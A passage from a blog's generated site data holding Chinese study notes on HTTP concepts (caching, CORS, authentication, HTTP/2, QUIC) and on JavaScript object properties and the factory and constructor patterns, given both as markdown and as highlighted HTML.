API</h3><ul>\n<li>每一种URL代表一种资源；</li>\n<li>客户端和服务器之间，传递这种资源的某种表现层；</li>\n<li>客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/377079155bbec1bc.jpg\"></p>\n<h3 id=\"6-缓存\"><a href=\"#6-缓存\" class=\"headerlink\" title=\"6.缓存\"></a>6.缓存</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/65a645bc76884d65.jpg\"></p>\n<ul>\n<li>强缓存资源本地有就直接用本地资源</li>\n<li>协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">缓存流程示意<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/1bd6b0f0379d4254.jpg\"></p>\n<h3 id=\"7-Cookie\"><a href=\"#7-Cookie\" class=\"headerlink\" title=\"7. Cookie\"></a>7. Cookie</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/f2c87718dc00674c.jpg\"></p>\n<h3 id=\"8-HTTP-2\"><a href=\"#8-HTTP-2\" class=\"headerlink\" title=\"8. HTTP/2\"></a>8. HTTP/2</h3><blockquote>\n<p>更快、更稳定、更简单</p>\n</blockquote>\n<ul>\n<li>使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；</li>\n<li>采用二进制编码，效率更高，有更好的压缩算法；</li>\n<li>消息：与逻辑请求或者响应消息对应的完整的一系列帧；</li>\n<li>数据流：已建立的连接内双向字节流，可以承载一条或多条消息；</li>\n<li>交错发送，接收方重组织；</li>\n<li>链接都是永久的，而且仅需要每个来源一个连接；</li>\n<li>流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/e85b4b47fe56a57a.jpg\"></p>\n<h3 id=\"9-HTTPS\"><a href=\"#9-HTTPS\" class=\"headerlink\" title=\"9.  HTTPS\"></a>9.  HTTPS</h3><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">经过TSL/SSL加密<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/d6e3190e2ebe64b2.jpg\"></p>\n<h2 id=\"二、HTTP协议的应用场景分析\"><a href=\"#二、HTTP协议的应用场景分析\" class=\"headerlink\" title=\"二、HTTP协议的应用场景分析\"></a>二、HTTP协议的应用场景分析</h2><h3 id=\"1-静态资源\"><a href=\"#1-静态资源\" class=\"headerlink\" title=\"1.静态资源\"></a>1.静态资源</h3><figure class=\"highlight arcade\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">方案：缓存+CDN+文件名<span class=\"hljs-built_in\">Hash</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>CDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；</li>\n<li>文件名Hash来保证每次刷新获得的资源是最新的；</li>\n</ul>\n<h3 id=\"2-登录\"><a href=\"#2-登录\" class=\"headerlink\" title=\"2.登录\"></a>2.登录</h3><p>头条页面密码登录会发出两个请求；</p>\n<ul>\n<li>请求1的Methods是OPTIONS：跨域、cross-origin</li>\n</ul>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs delphi\">一个url由scheme+host <span class=\"hljs-keyword\">name</span>+port组成<br>e.g. https:<span class=\"hljs-comment\">//www.example.com:443</span><br>跨域：scheme、host <span class=\"hljs-keyword\">name</span>、prot任意一个有区别都认为是跨域；<br>Note：如果https没有写明<span class=\"hljs-number\">443</span>端口号也可以认为是同域；http默认<span class=\"hljs-number\">80</span>；port可以不写；<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>跨域</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc762107d5ca72062d5196.jpg\"></p>\n<h5 id=\"跨域解决方案：\"><a href=\"#跨域解决方案：\" class=\"headerlink\" title=\"跨域解决方案：\"></a>跨域解决方案：</h5><ul>\n<li>CORS</li>\n<li>代理服务器：同源策略是浏览器的安全策略，不是http的</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/03/2ed3f548ffca14ab.jpg\"></p>\n<ul>\n<li>IFrame：存在诸多不便；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc76b007d5ca72062e430c.jpg\"></p>\n<h5 id=\"鉴权\"><a href=\"#鉴权\" class=\"headerlink\" title=\"鉴权\"></a>鉴权</h5><ul>\n<li>session+cookie</li>\n<li>JWT（JSON web token）token具有唯一性；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc76fe07d5ca72062e9fdb.jpg\"></p>\n<ul>\n<li>SSO（Single Sign On）：单点登录</li>\n</ul>\n<p>重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；</p>\n<h2 id=\"三、实战\"><a href=\"#三、实战\" class=\"headerlink\" title=\"三、实战\"></a>三、实战</h2><h3 id=\"1-Ajax之XHR\"><a href=\"#1-Ajax之XHR\" class=\"headerlink\" title=\"1. Ajax之XHR\"></a>1. Ajax之XHR</h3><h3 id=\"2-常用请求库Axios（参考官网）\"><a href=\"#2-常用请求库Axios（参考官网）\" class=\"headerlink\" title=\"2.常用请求库Axios（参考官网）\"></a>2.常用请求库Axios（参考官网）</h3><h3 id=\"3-网络优化（需要补充）\"><a href=\"#3-网络优化（需要补充）\" class=\"headerlink\" title=\"3.网络优化（需要补充）\"></a>3.网络优化（需要补充）</h3><p><img src=\"https://pic.imgdb.cn/item/63dc79d407d5ca7206341e84.jpg\"></p>\n<h3 id=\"4-稳定性\"><a href=\"#4-稳定性\" class=\"headerlink\" title=\"4.稳定性\"></a>4.稳定性</h3><ul>\n<li>重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；</li>\n<li>缓存合理使用，作为最后一道防线；</li>\n</ul>\n<p><img src=\"https://pic.imgdb.cn/item/63dc7a1507d5ca7206351481.jpg\"></p>\n<h2 id=\"四、拓展\"><a href=\"#四、拓展\" class=\"headerlink\" title=\"四、拓展\"></a>四、拓展</h2><h3 id=\"1-Websocket\"><a href=\"#1-Websocket\" class=\"headerlink\" title=\"1.Websocket\"></a>1.Websocket</h3><ul>\n<li>进行全双工的通讯；</li>\n<li>实时性要求较高，例如聊天室；（开启聊天室demo）</li>\n<li>url使用ws:// 或者 wss：//</li>\n</ul>\n<h3 id=\"2-QUIC（Quick-UDP-Internet-Connection）\"><a href=\"#2-QUIC（Quick-UDP-Internet-Connection）\" class=\"headerlink\" title=\"2.QUIC（Quick UDP Internet Connection）\"></a>2.QUIC（Quick UDP Internet Connection）</h3><ul>\n<li>相比于TCP更快；</li>\n<li>可靠性类似于TCP；</li>\n<li>支持h2的多路复用，没有TCP的HOL文通；</li>\n<li>前向纠错FEC</li>\n<li>用户空间的阻塞算法，最新的BBR算法；</li>\n</ul>\n"},{"title":"Javascript高级程序设计（6）","date":"2021-01-12T13:18:45.000Z","mp3":null,"cover":"img/bg1.jpg","_content":"\n# CH6\n\n### 6.1 对象\n\n```javascript\n//eailer\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=18;\nperson.job=\"Student\";\n\nperson.sayName=function(){\n    alert(person.name);\n    console.log(person.name);\n};\n\nperson.sayAge=function(){\n    alert(person.age);\n    console.log(person.age);\n};\n\nperson.sayJob=function(){\n    alert(person.job);\n    console.log(person.job);\n};\n\n\n//Face to object\nvar person1={\n    name:\"Jack\",\n    age:21,\n    job:\"Software Engineer.\",\n\n    sayName:function(){\n        console.log(this.name);\n    },\n    sayAge:function(){\n        console.log(this.age);\n    },\n    sayJob:function(){\n        console.log(this.job);\n    }\n}\n\n```\n\n#### 6.1.1 属性类型：数据属性和访问器属性\n\n##### （1）数据属性：\n\n​\t\tConfigurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tEnumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tWritable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tValue：属性的数据值；默认为undefined；\n\n使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；\n\n```javascript\n\nvar person2={};\nObject.defineProperty(person2,\"name\",{\n    Writable:false,\n    value:\"Jack\"\n});\n\nalert(person2.name);\nperson1.name=\"Nancy\";\nalert(person2.name);\n\n//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；\n```\n\n##### （2）访问器属性：\n\n​\t\tConfigurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tEnumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；\t\t\n\n​\t\tGet：读取属性时调用的函数，默认为undefined；\n\n​\t\tSet：写入属性时使用，默认为undefined；\n\n```javascript\n//访问器属性实例\nvar book={\n    _year:2021,\n    edition:1\n};\nObject.defineProperty(book,\"year\",{\n    get:function(){\n        return this._year;\n    },\n    set:function(newValue){\n        this._year=newValue;\n        this.edition+=newValue-2021;\n    }\n});\n\nbook.year=2023;\nalert(book.edition);\n```\n\n6.1.2 定义多个属性：Object.defineproperties()方法\n\n```javascript\nvar book = {};\nObject.defineProperties(book, {\n    _year: {\n        writable: true,\n        value: 2020\n    },\n    edition: {\n        writable: true,\n        value: 1\n    },\n    year: {\n        get: function () {\n            return this._year;\n        },\n        set: function (newValue) {\n            if (newValue > this._year) {\n                this._year = newValue;\n                this.edition += newValue - 2020;\n            }\n        }\n    }\n})\n\n```\n\n### 6.2创建对象\n\n#### 6.2.1工厂模式\n\n​\t解决了创建对象的问题但是没有解决对象识别的问题；\n\n#### 6.2.2构造函数模式\n\n​\t（1）创建一个新对象；\n\n​\t（2）将函数得作用域赋值给对象；\n\n​\t（3）执行构造函数得代码，为对象添加属性；\n\n​\t（4）返回新对象；\n\n```javascript\n\n//工厂模式方法\nfunction createPerson(name,age,job){\n    var o=Object();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayHi=function(){\n        alert(o.name);\n    }\n    return o;\n}\n\n//构造函数方法模式\nfunction Person(name,age,job){\n    this.name=name;\n    this.age=age;\n    this.job=job;\n\n    //函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;\n    this.sayName=function(){\n        alert(this.name);\n    };\n\n}\n\nvar person1=createPerson(\"Martin\",18,\"Software enigneer\");\nvar person2=new Person(\"Matin\",20,\"Cyber Security Engineer\");\n\n\n```\n\n6.2.3 原型模式\n\n好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）\n\n","source":"_posts/Javascript高级程序设计（6）.md","raw":"---\ntitle: Javascript高级程序设计（6）\ndate: 2021-1-12 21:18:45\ncategories: \n    - 前端\ntags: \n    - Javascript\n    - 笔记\n    - Javascript高级程序设计\nmp3: \ncover: img/bg1.jpg\n---\n\n# CH6\n\n### 6.1 对象\n\n```javascript\n//eailer\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=18;\nperson.job=\"Student\";\n\nperson.sayName=function(){\n    alert(person.name);\n    console.log(person.name);\n};\n\nperson.sayAge=function(){\n    alert(person.age);\n    console.log(person.age);\n};\n\nperson.sayJob=function(){\n    alert(person.job);\n    console.log(person.job);\n};\n\n\n//Face to object\nvar person1={\n    name:\"Jack\",\n    age:21,\n    job:\"Software Engineer.\",\n\n    sayName:function(){\n        console.log(this.name);\n    },\n    sayAge:function(){\n        console.log(this.age);\n    },\n    sayJob:function(){\n        console.log(this.job);\n    }\n}\n\n```\n\n#### 6.1.1 属性类型：数据属性和访问器属性\n\n##### （1）数据属性：\n\n​\t\tConfigurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tEnumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tWritable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tValue：属性的数据值；默认为undefined；\n\n使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；\n\n```javascript\n\nvar person2={};\nObject.defineProperty(person2,\"name\",{\n    Writable:false,\n    value:\"Jack\"\n});\n\nalert(person2.name);\nperson1.name=\"Nancy\";\nalert(person2.name);\n\n//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；\n```\n\n##### （2）访问器属性：\n\n​\t\tConfigurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n\n​\t\tEnumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；\t\t\n\n​\t\tGet：读取属性时调用的函数，默认为undefined；\n\n​\t\tSet：写入属性时使用，默认为undefined；\n\n```javascript\n//访问器属性实例\nvar book={\n    _year:2021,\n    edition:1\n};\nObject.defineProperty(book,\"year\",{\n    get:function(){\n        return this._year;\n    },\n    set:function(newValue){\n        this._year=newValue;\n        this.edition+=newValue-2021;\n    }\n});\n\nbook.year=2023;\nalert(book.edition);\n```\n\n6.1.2 定义多个属性：Object.defineproperties()方法\n\n```javascript\nvar book = {};\nObject.defineProperties(book, {\n    _year: {\n        writable: true,\n        value: 2020\n    },\n    edition: {\n        writable: true,\n        value: 1\n    },\n    year: {\n        get: function () {\n            return this._year;\n        },\n        set: function (newValue) {\n            if (newValue > this._year) {\n                this._year = newValue;\n                this.edition += newValue - 2020;\n            }\n        }\n    }\n})\n\n```\n\n### 6.2创建对象\n\n#### 6.2.1工厂模式\n\n​\t解决了创建对象的问题但是没有解决对象识别的问题；\n\n#### 6.2.2构造函数模式\n\n​\t（1）创建一个新对象；\n\n​\t（2）将函数得作用域赋值给对象；\n\n​\t（3）执行构造函数得代码，为对象添加属性；\n\n​\t（4）返回新对象；\n\n```javascript\n\n//工厂模式方法\nfunction createPerson(name,age,job){\n    var o=Object();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayHi=function(){\n        alert(o.name);\n    }\n    return o;\n}\n\n//构造函数方法模式\nfunction Person(name,age,job){\n    this.name=name;\n    this.age=age;\n    this.job=job;\n\n    //函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;\n    this.sayName=function(){\n        alert(this.name);\n    };\n\n}\n\nvar person1=createPerson(\"Martin\",18,\"Software enigneer\");\nvar person2=new Person(\"Matin\",20,\"Cyber Security Engineer\");\n\n\n```\n\n6.2.3 原型模式\n\n好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）\n\n","slug":"Javascript高级程序设计（6）","published":1,"updated":"2021-01-26T12:12:56.000Z","_id":"clg29vyg50013ao9c7nnahupt","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"CH6\"><a href=\"#CH6\" class=\"headerlink\" title=\"CH6\"></a>CH6</h1><h3 id=\"6-1-对象\"><a href=\"#6-1-对象\" class=\"headerlink\" title=\"6.1 对象\"></a>6.1 对象</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//eailer</span><br><span class=\"hljs-keyword\">var</span> person=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br>person.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">18</span>;<br>person.<span class=\"hljs-property\">job</span>=<span class=\"hljs-string\">&quot;Student&quot;</span>;<br><br>person.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">name</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">name</span>);<br>&#125;;<br><br>person.<span class=\"hljs-property\">sayAge</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">age</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">age</span>);<br>&#125;;<br><br>person.<span class=\"hljs-property\">sayJob</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-title function_\">alert</span>(person.<span class=\"hljs-property\">job</span>);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">job</span>);<br>&#125;;<br><br><br><span class=\"hljs-comment\">//Face to object</span><br><span class=\"hljs-keyword\">var</span> person1=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Jack&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">21</span>,<br>    <span class=\"hljs-attr\">job</span>:<span class=\"hljs-string\">&quot;Software Engineer.&quot;</span>,<br><br>    <span class=\"hljs-attr\">sayName</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;,<br>    <span class=\"hljs-attr\">sayAge</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>);<br>    &#125;,<br>    <span class=\"hljs-attr\">sayJob</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-1-1-属性类型：数据属性和访问器属性\"><a href=\"#6-1-1-属性类型：数据属性和访问器属性\" class=\"headerlink\" title=\"6.1.1 属性类型：数据属性和访问器属性\"></a>6.1.1 属性类型：数据属性和访问器属性</h4><h5 id=\"（1）数据属性：\"><a href=\"#（1）数据属性：\" class=\"headerlink\" title=\"（1）数据属性：\"></a>（1）数据属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Writable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Value：属性的数据值；默认为undefined；</p>\n<p>使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><br><span class=\"hljs-keyword\">var</span> person2=&#123;&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperty</span>(person2,<span class=\"hljs-string\">&quot;name&quot;</span>,&#123;<br>    <span class=\"hljs-title class_\">Writable</span>:<span class=\"hljs-literal\">false</span>,<br>    <span class=\"hljs-attr\">value</span>:<span class=\"hljs-string\">&quot;Jack&quot;</span><br>&#125;);<br><br><span class=\"hljs-title function_\">alert</span>(person2.<span class=\"hljs-property\">name</span>);<br>person1.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Nancy&quot;</span>;<br><span class=\"hljs-title function_\">alert</span>(person2.<span class=\"hljs-property\">name</span>);<br><br><span class=\"hljs-comment\">//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"（2）访问器属性：\"><a href=\"#（2）访问器属性：\" class=\"headerlink\" title=\"（2）访问器属性：\"></a>（2）访问器属性：</h5><p>​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；</p>\n<p>​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；        </p>\n<p>​        Get：读取属性时调用的函数，默认为undefined；</p>\n<p>​        Set：写入属性时使用，默认为undefined；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">//访问器属性实例</span><br><span class=\"hljs-keyword\">var</span> book=&#123;<br>    <span class=\"hljs-attr\">_year</span>:<span class=\"hljs-number\">2021</span>,<br>    <span class=\"hljs-attr\">edition</span>:<span class=\"hljs-number\">1</span><br>&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperty</span>(book,<span class=\"hljs-string\">&quot;year&quot;</span>,&#123;<br>    <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>    &#125;,<br>    <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>        <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2021</span>;<br>    &#125;<br>&#125;);<br><br>book.<span class=\"hljs-property\">year</span>=<span class=\"hljs-number\">2023</span>;<br><span class=\"hljs-title function_\">alert</span>(book.<span class=\"hljs-property\">edition</span>);<br></code></pre></td></tr></table></figure>\n\n<p>6.1.2 定义多个属性：Object.defineproperties()方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> book = &#123;&#125;;<br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperties</span>(book, &#123;<br>    <span class=\"hljs-attr\">_year</span>: &#123;<br>        <span class=\"hljs-attr\">writable</span>: <span class=\"hljs-literal\">true</span>,<br>        <span class=\"hljs-attr\">value</span>: <span class=\"hljs-number\">2020</span><br>    &#125;,<br>    <span class=\"hljs-attr\">edition</span>: &#123;<br>        <span class=\"hljs-attr\">writable</span>: <span class=\"hljs-literal\">true</span>,<br>        <span class=\"hljs-attr\">value</span>: <span class=\"hljs-number\">1</span><br>    &#125;,<br>    <span class=\"hljs-attr\">year</span>: &#123;<br>        <span class=\"hljs-attr\">get</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>        &#125;,<br>        <span class=\"hljs-attr\">set</span>: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">newValue</span>) &#123;<br>            <span class=\"hljs-keyword\">if</span> (newValue &gt; <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>) &#123;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span> = newValue;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span> += newValue - <span class=\"hljs-number\">2020</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-2创建对象\"><a href=\"#6-2创建对象\" class=\"headerlink\" title=\"6.2创建对象\"></a>6.2创建对象</h3><h4 id=\"6-2-1工厂模式\"><a href=\"#6-2-1工厂模式\" class=\"headerlink\" title=\"6.2.1工厂模式\"></a>6.2.1工厂模式</h4><p>​    解决了创建对象的问题但是没有解决对象识别的问题；</p>\n<h4 id=\"6-2-2构造函数模式\"><a href=\"#6-2-2构造函数模式\" class=\"headerlink\" title=\"6.2.2构造函数模式\"></a>6.2.2构造函数模式</h4><p>​    （1）创建一个新对象；</p>\n<p>​    （2）将函数得作用域赋值给对象；</p>\n<p>​    （3）执行构造函数得代码，为对象添加属性；</p>\n<p>​    （4）返回新对象；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><br><span class=\"hljs-comment\">//工厂模式方法</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> o=<span class=\"hljs-title class_\">Object</span>();<br>    o.<span class=\"hljs-property\">name</span>=name;<br>    o.<span class=\"hljs-property\">age</span>=age;<br>    o.<span class=\"hljs-property\">job</span>=job;<br>    o.<span class=\"hljs-property\">sayHi</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-title function_\">alert</span>(o.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> o;<br>&#125;<br><br><span class=\"hljs-comment\">//构造函数方法模式</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span 